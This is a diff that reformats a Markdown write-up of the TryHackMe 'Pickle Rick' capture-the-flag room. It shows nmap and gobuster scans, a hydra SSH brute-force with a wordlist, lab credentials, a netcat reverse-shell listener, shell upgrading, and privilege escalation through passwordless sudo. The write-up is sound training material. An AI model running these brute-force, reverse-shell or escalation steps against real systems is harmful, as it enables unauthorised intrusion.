@@ -18,23 +18,22 @@ tags:
 # Introduction
 -------------
 
-This writeup documents the penetration testing of the [**Pickle Rick**](https://tryhackme.com/room/picklerick) machine from the [**TryHackMe**](https://tryhackme.com/) platform.
-
-In this case I'll try to log into a panel which is vulnerable to command injection and I'll find the 3 ingredients the CTF wants us to submit.
+This writeup documents the penetration testing of the [**Pickle Rick**](https://tryhackme.com/room/picklerick) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll try to log into a panel which is vulnerable to command injection and I'll find the 3 ingredients the CTF wants us to submit.
 
 <br>
 # Information Gathering
 ------------------
 
-Once we have discovered the IP of the machine we need to enumerate as much information as possible.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
 
-When we ping a machine that is in our local network, normally:
-* TTL 64: Linux machine.
-* TTL 128: Windows machine.
-We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.
+A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+* TTL 64: Linux.
+* TTL 128: Windows.
 
-```java
+```bash
 ❯ ping -c 1 10.10.195.201
+```
+```
 PING 10.10.195.201 (10.10.195.201) 56(84) bytes of data.
 64 bytes from 10.10.195.201: icmp_seq=1 ttl=63 time=55.0 ms
 
@@ -43,10 +42,12 @@ PING 10.10.195.201 (10.10.195.201) 56(84) bytes of data.
 rtt min/avg/max/mdev = 54.986/54.986/54.986/0.000 ms
 ```
 
-In this case, it seems to be a Linux machine. Let's do a port scan with nmap.
+In this case, it seems to be a Linux machine. Let's perform some scans.
 
-```java
+```bash
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.195.201 -oG allPorts
+```
+```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:26 CET
 Initiating SYN Stealth Scan at 22:26
@@ -68,10 +69,10 @@ Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
            Raw packets sent: 92355 (4.064MB) | Rcvd: 59949 (2.398MB)
 ```
 
-Let's perform a deeper scan with the parameter ``-sCV`` over those ports.
-
-```java
+```bash
 ❯ nmap -sCV -p22,80 10.10.195.201 -oN targeted
+```
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:36 CET
 Nmap scan report for 10.10.195.201
 Host is up (0.057s latency).
@@ -98,6 +99,9 @@ We are facing an **Ubuntu Focal**.
 
 We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:
 
+```bash
+whatweb http://10.10.195.201
+```
 ```
 http://10.10.195.201 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.195.201], JQuery, Script, Title[Rick is sup4r cool]
 ```
@@ -120,6 +124,8 @@ Let's take a look in the source code.
 
 ```bash
 ❯ hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.195.201 ssh
+```
+```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-08 22:48:15
@@ -131,8 +137,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-08 22:48:
 
 But the machine doesn't support password authentication, I think it's using SSH key based auth.
 
-```java
+```bash
 ❯ gobuster dir -u http://10.10.195.201/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,xml,php,bak
+```
+```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -161,9 +169,6 @@ Finished
 ===============================================================
 ```
 
-
-
-
 <br>
 # Vulnerability Assessment
 -------
@@ -182,13 +187,19 @@ We got the **credentials**  ``R1ckRul3s:Wubbalubbadubdub``, if you put them in l
 
 Let's try to get a reverse shell.
 
-```php
+```bash
 ❯ nc -nvlp 443
+```
+```
 listening on [any] 443 ...
 connect to [10.8.78.182] from (UNKNOWN) [10.10.39.70] 58178
 bash: cannot set terminal process group (1001): Inappropriate ioctl for device
 bash: no job control in this shell
+```
+```bash
 www-data@ip-10-10-39-70:/var/www/html$ whoami
+```
+```
 www-data
 ```
 
@@ -197,35 +208,46 @@ www-data
 ------
 
 ```bash
-script /dev/null -c bash
-Ctrl+Z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=bash
-stty rows 44 columns 185
+# tty upgrading
+❯ script /dev/null -c bash
+❯ Ctrl+Z
+❯ stty raw -echo; fg
+❯ reset xterm
+❯ export TERM=xterm
+❯ export SHELL=bash
+❯ stty rows 44 columns 185
 ```
 
 Finally, we need to find those 3 ingredients and submit them.
 
-```
+```bash
 www-data@ip-10-10-39-70:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
+```
+```
 ***REDACTED***
 ```
 
-```
+```bash
 www-data@ip-10-10-39-70:/home/rick$ cat second\ ingredients 
+```
+```
 ***REDACTED***
 ```
 
-```
+```bash
 www-data@ip-10-10-39-70:/home/ubuntu$ sudo -l
+```
+```
 Matching Defaults entries for www-data on ip-10-10-39-70:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on ip-10-10-39-70:
     (ALL) NOPASSWD: ALL
+```
+```bash
 www-data@ip-10-10-39-70:/home/ubuntu$ sudo su
 root@ip-10-10-39-70:~# cat /root/3rd.txt 
+```
+```
 3rd ingredients: ***REDACTED***
 ```
